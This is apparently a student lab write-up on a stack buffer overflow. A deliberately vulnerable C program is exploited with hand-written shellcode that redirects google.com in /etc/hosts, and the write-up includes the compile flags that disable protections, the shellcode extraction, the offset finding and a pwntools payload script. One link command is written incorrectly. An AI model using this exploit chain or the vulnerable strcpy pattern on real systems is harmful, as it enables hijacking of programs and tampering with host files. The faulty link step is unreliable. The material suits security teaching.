# Lab #1
## Task 1: Software buffer overflow attack

### 1. Compile asm program and C program to executable code:
*Note: Both files are to be put in the same folder*

***Compile vuln.c:***

```c
#include <stdio.h>
#include <string.h>

int main(int argc, char* argv[])
{
	char buffer[16];
	strcpy(buffer,argv[1]);
	return 0;
}
```
*The function strcpy(buffer, argv[1]) copies data into the buffer without checking for overflow, making it vulnerable.*

To compile the vulnerable C program without security mechanisms, run:

```sh
gcc -g -m32 vuln.c -o vuln.out -fno-stack-protector -z execstack 
```

Here, -fno-stack-protector disables stack protection, and -z execstack
allows execution on the stack (where the shell code will be placed).

***Compile sh.asm:***

```asm
global _start

section .text

_start:
    xor ecx, ecx
    mul ecx
    mov al, 0x5     
    push ecx
    push 0x7374736f     ;/etc///hosts
    push 0x682f2f2f
    push 0x6374652f
    mov ebx, esp
    mov cx, 0x401       ;permmisions
    int 0x80            ;syscall to open file

    xchg eax, ebx
    push 0x4
    pop eax
    jmp short _load_data    ;jmp-call-pop technique to load the map

_write:
    pop ecx
    push 20             ;length of the string, dont forget to modify if changes the map
    pop edx
    int 0x80            ;syscall to write in the file

    push 0x6
    pop eax
    int 0x80            ;syscall to close the file

    push 0x1
    pop eax
    int 0x80            ;syscall to exit

_load_data:
    call _write
    google db "127.1.1.1 google.com"

```

Then, compile it using nasm and ld:

```sh
nasm -f elf sh.asm -o sh.o
ld -m elf_i386 sh -o sh.o
```

This will generate an object file from the assembly file.

### 2. Trigger the buffer overflow
"Conduct the attack so that when C executable code runs, shellcode will be triggered and a new entry is added to the /etc/hosts file on your linux."

#### Step 1: Extract shellcode from the binary
*We use objdump to extract the byte sequence for the attack:*

```sh
objdump -d sh | grep '[0-9a-f]:' | grep -v 'file' | cut -f2 -d: | cut -f1-6 -d' ' | tr -s ' ' | tr '\t' ' ' | sed 's/ $//' | sed 's/ /\\x/g' | paste -d '' -s
```

*Which gives this after cleaning:*

```\x31\xc9\xf7\xe1\xb0\x05\x51\x68\x6f\x73\x74\x73\x68\x2f\x2f\x2f\x68\x68\x2f\x65\x74\x63\x89\xe3\x66\xb9\x01\x04\xcd\x80\x93\x6a\x04\x58\xeb\x10\x59\x6a\x14\x5a\xcd\x80\x6a\x06\x58\xcd\x80\x6a\x01\x58\xcd\x80\xe8\xeb\xff\xff\xff\x31\x32\x37\x2e\x31\x2e\x31\x2e\x31\x20\x67\x6f\x6f\x67\x6c\x65\x2e\x63\x6f\x6d```

#### Step 2: Identify the offset
*(Where the buffer overflows into the return address)*

```sh
gdb -q vuln.out
gdb-peda$ run $(python -c 'print "A"*20')
```

[img 1]
Here, we can see `0xffffd740 ('A' <repeats 20 times>)` on the stack. The buffer is stored here, which is likely to be where the shell code is placed after the overflow. 

### 3: Construct the payload and conduct the attack
#### Step 1: Construct the payload

```py
from pwn import *

payload = b"A" * 20  # Fill the buffer and EBP to go straight to the return address
payload += b"\x40\xd7\xff\xff"  # Overwrite EIP, address where execution will jump to after overflow
payload += b"\x90" * 200  # NOP sled in case return address is off
payload += b"\x31\xc9\xf7\xe1\xb0\x05\x51\x68\x6f\x73\x74\x73\x68\x2f\x2f\x2f\x68\x68\x2f\x65\x74\x63\x89\xe3\x66\xb9\x01\x04\xcd\x80\x93\x6a\x04\x58\xeb\x10\x59\x6a\x14\x5a\xcd\x80\x6a\x06\x58\xcd\x80\x6a\x01\x58\xcd\x80\xe8\xeb\xff\xff\xff\x31\x32\x37\x2e\x31\x2e\x31\x2e\x31\x20\x67\x6f\x6f\x67\x6c\x65\x2e\x63\x6f\x6d"  # Shell code

with open("payload.txt", "wb") as f:
    f.write(payload)
```

#### Step 2: Run and verify attack

##### 1. Run the program (with root permission)
```sh
sudo ./vuln.out "$(cat payload.txt)"
```

[img 2]

##### 2. Verify the changes
```sh
cat /etc/hosts
```

[img 3]
















